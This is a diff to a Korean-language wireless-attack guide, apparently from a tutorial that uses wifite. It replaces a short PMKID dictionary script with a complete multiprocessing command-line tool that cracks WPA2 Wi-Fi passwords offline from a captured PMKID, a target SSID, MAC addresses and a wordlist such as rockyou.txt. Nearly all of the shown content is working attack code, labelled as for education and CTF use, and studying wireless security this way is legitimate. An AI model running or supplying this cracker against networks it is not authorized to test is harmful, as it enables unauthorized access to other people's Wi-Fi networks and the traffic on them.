@@ -277,70 +277,224 @@ sudo wifite \
 
 ```python
 #!/usr/bin/env python3
-"""PMKID 사전 계산 테이블 생성"""
+"""
+PMKID/WPA2 핸드셰이크 오프라인 크래킹 도구 (교육/CTF 목적)
+사용: python3 pmkid_crack.py --ssid MyWiFi --pmkid d6fd... --ap-mac AA:BB --client-mac 11:22 --wordlist rockyou.txt
+"""
 
+from __future__ import annotations
+
+import argparse
 import hashlib
 import hmac
-import struct
+import multiprocessing
+import sys
+import time
+from dataclasses import dataclass
+from pathlib import Path
+from typing import Optional
 
+
+# ------------------------------------------------------------------ #
+#  WPA2 암호화 함수
+# ------------------------------------------------------------------ #
 def compute_pmk(password: str, ssid: str) -> bytes:
-    """PMK = PBKDF2-SHA1(password, ssid, 4096, 32)"""
+    """PMK = PBKDF2-HMAC-SHA1(password, ssid, 4096 rounds, 32 bytes)"""
     return hashlib.pbkdf2_hmac(
-        'sha1',
-        password.encode('utf-8'),
-        ssid.encode('utf-8'),
+        "sha1",
+        password.encode("utf-8", errors="replace"),
+        ssid.encode("utf-8", errors="replace"),
         4096,
-        32
+        32,
     )
 
-def compute_pmkid(pmk: bytes, ap_mac: str, client_mac: str) -> str:
-    """PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || Client_MAC)"""
-    
-    # MAC 주소 바이트 변환
-    ap_bytes = bytes.fromhex(ap_mac.replace(':', ''))
-    client_bytes = bytes.fromhex(client_mac.replace(':', ''))
-    
+
+def compute_pmkid(pmk: bytes, ap_mac_hex: str, client_mac_hex: str) -> str:
+    """
+    PMKID = HMAC-SHA1(PMK, b'PMK Name' || AP_MAC_bytes || Client_MAC_bytes)[:16]
+    """
+    ap_bytes = bytes.fromhex(ap_mac_hex.replace(":", "").replace("-", ""))
+    client_bytes = bytes.fromhex(client_mac_hex.replace(":", "").replace("-", ""))
     data = b"PMK Name" + ap_bytes + client_bytes
-    
-    pmkid = hmac.new(pmk, data, hashlib.sha1).digest()
-    return pmkid[:16].hex()
+    digest = hmac.new(pmk, data, hashlib.sha1).digest()
+    return digest[:16].hex()
 
-def generate_pmkid_table(ssid: str, wordlist_file: str, 
-                          ap_mac: str, client_mac: str):
-    """PMKID 사전 테이블 생성"""
-    
-    found = False
-    
-    with open(wordlist_file, 'r', encoding='latin-1') as f:
-        for i, line in enumerate(f):
-            password = line.strip()
-            if not password:
-                continue
-            
+
+def compute_mic(pmk: bytes, ap_nonce: bytes, client_nonce: bytes,
+                ap_mac: bytes, client_mac: bytes, eapol_data: bytes) -> str:
+    """
+    PTK 유도 후 MIC 계산 (4-Way Handshake 검증용)
+    PTK = PRF-512(PMK, 'Pairwise key expansion' || min/max(macs) || min/max(nonces))
+    """
+    # PTK 유도 (802.11i PRF-512)
+    def prf512(key: bytes, a: bytes, b: bytes) -> bytes:
+        result = b""
+        for i in range(4):
+            result += hmac.new(key, a + b"\x00" + b + bytes([i]), hashlib.sha1).digest()
+        return result[:64]
+
+    min_mac = min(ap_mac, client_mac)
+    max_mac = max(ap_mac, client_mac)
+    min_nonce = min(ap_nonce, client_nonce)
+    max_nonce = max(ap_nonce, client_nonce)
+
+    ptk = prf512(
+        pmk,
+        b"Pairwise key expansion",
+        min_mac + max_mac + min_nonce + max_nonce,
+    )
+    kck = ptk[:16]   # Key Confirmation Key
+    mic = hmac.new(kck, eapol_data, hashlib.md5).hexdigest()
+    return mic
+
+
+# ------------------------------------------------------------------ #
+#  크래킹 워커 (멀티프로세싱용)
+# ------------------------------------------------------------------ #
+def _crack_worker(
+    chunk: list[str],
+    ssid: str,
+    target_pmkid: str,
+    ap_mac: str,
+    client_mac: str,
+    result_queue: multiprocessing.Queue,
+) -> None:
+    for password in chunk:
+        password = password.strip()
+        if not password:
+            continue
+        try:
             pmk = compute_pmk(password, ssid)
-            pmkid = compute_pmkid(pmk, ap_mac, client_mac)
-            
-            if i % 1000 == 0:
-                print(f"\r[*] 시도: {i:,}", end='', flush=True)
-            
-            # 수집된 PMKID와 비교
-            if pmkid == TARGET_PMKID:
-                print(f"\n[+] 비밀번호 발견: {password}")
-                found = True
-                break
-    
-    if not found:
-        print(f"\n[-] 비밀번호를 찾지 못했습니다.")
+            computed = compute_pmkid(pmk, ap_mac, client_mac)
+            if computed == target_pmkid.lower():
+                result_queue.put(("found", password))
+                return
+        except Exception:
+            continue
+    result_queue.put(("done", None))
 
-TARGET_PMKID = "d6fd3e5xxxxxxxxxxxxxx"  # 수집된 PMKID
+
+# ------------------------------------------------------------------ #
+#  크래커 메인 클래스
+# ------------------------------------------------------------------ #
+@dataclass
+class PMKIDCracker:
+    ssid: str
+    target_pmkid: str
+    ap_mac: str
+    client_mac: str
+    wordlist: str
+    workers: int = multiprocessing.cpu_count()
+
+    def crack(self) -> Optional[str]:
+        wl_path = Path(self.wordlist)
+        if not wl_path.exists():
+            print(f"[-] 워드리스트 없음: {wl_path}", file=sys.stderr)
+            return None
+
+        # 워드리스트 전체 로드 (대용량이면 청크 처리)
+        print(f"[*] 워드리스트 로드 중: {wl_path}", file=sys.stderr)
+        try:
+            with open(wl_path, encoding="latin-1", errors="replace") as fh:
+                words = fh.readlines()
+        except OSError as exc:
+            print(f"[-] 파일 읽기 실패: {exc}", file=sys.stderr)
+            return None
+
+        total = len(words)
+        print(f"[*] {total:,}개 단어 | 프로세스: {self.workers}개", file=sys.stderr)
+        print(f"[*] 타겟 PMKID: {self.target_pmkid}", file=sys.stderr)
+        print(f"[*] SSID: {self.ssid}  AP: {self.ap_mac}  Client: {self.client_mac}", file=sys.stderr)
+
+        chunk_size = max(1, total // self.workers)
+        chunks = [words[i : i + chunk_size] for i in range(0, total, chunk_size)]
+
+        result_queue: multiprocessing.Queue = multiprocessing.Queue()
+        processes = []
+        for chunk in chunks:
+            p = multiprocessing.Process(
+                target=_crack_worker,
+                args=(chunk, self.ssid, self.target_pmkid, self.ap_mac, self.client_mac, result_queue),
+            )
+            p.start()
+            processes.append(p)
+
+        start = time.time()
+        found_pw: Optional[str] = None
+        done_count = 0
+
+        while done_count < len(processes):
+            msg_type, value = result_queue.get()
+            if msg_type == "found":
+                found_pw = value
+                for p in processes:
+                    p.terminate()
+                break
+            else:
+                done_count += 1
+
+        for p in processes:
+            p.join()
+
+        elapsed = time.time() - start
+
+        if found_pw:
+            rate = total / elapsed if elapsed > 0 else 0
+            print(f"\n[+] 비밀번호 발견: {found_pw}")
+            print(f"[+] 경과 시간: {elapsed:.1f}초  속도: {rate:,.0f} PMK/s")
+        else:
+            print(f"\n[-] 비밀번호를 찾지 못했습니다. ({elapsed:.1f}초 / {total:,}개 시도)")
+
+        return found_pw
+
+
+# ------------------------------------------------------------------ #
+#  CLI
+# ------------------------------------------------------------------ #
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        description="PMKID/WPA2 핸드셰이크 오프라인 크래킹 도구 (교육/CTF 목적)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="예시:\n"
+               "  python3 pmkid_crack.py \\\n"
+               "    --ssid MyWiFi \\\n"
+               "    --pmkid d6fd3e50a1234567890abcdef1234567 \\\n"
+               "    --ap-mac AA:BB:CC:DD:EE:FF \\\n"
+               "    --client-mac 11:22:33:44:55:66 \\\n"
+               "    --wordlist /usr/share/wordlists/rockyou.txt",
+    )
+    parser.add_argument("--ssid",       required=True, help="타겟 SSID")
+    parser.add_argument("--pmkid",      required=True, help="수집된 PMKID (hex 32자)")
+    parser.add_argument("--ap-mac",     required=True, help="AP BSSID (AA:BB:CC:DD:EE:FF)")
+    parser.add_argument("--client-mac", required=True, help="클라이언트 MAC")
+    parser.add_argument("--wordlist",   required=True, metavar="FILE", help="워드리스트 파일")
+    parser.add_argument(
+        "--workers", type=int, default=multiprocessing.cpu_count(),
+        help=f"병렬 프로세스 수 (기본: {multiprocessing.cpu_count()})",
+    )
+    return parser
+
+
+def main() -> None:
+    parser = build_parser()
+    args = parser.parse_args()
+
+    if len(args.pmkid) != 32:
+        parser.error("PMKID는 32자리 hex 문자열이어야 합니다")
+
+    cracker = PMKIDCracker(
+        ssid=args.ssid,
+        target_pmkid=args.pmkid,
+        ap_mac=args.ap_mac,
+        client_mac=args.client_mac,
+        wordlist=args.wordlist,
+        workers=args.workers,
+    )
+    cracker.crack()
+
 
 if __name__ == "__main__":
-    generate_pmkid_table(
-        ssid="TargetWiFi",
-        wordlist_file="wordlist.txt",
-        ap_mac="AA:BB:CC:DD:EE:FF",
-        client_mac="11:22:33:44:55:66"
-    )
+    main()
 ```
 
 ---
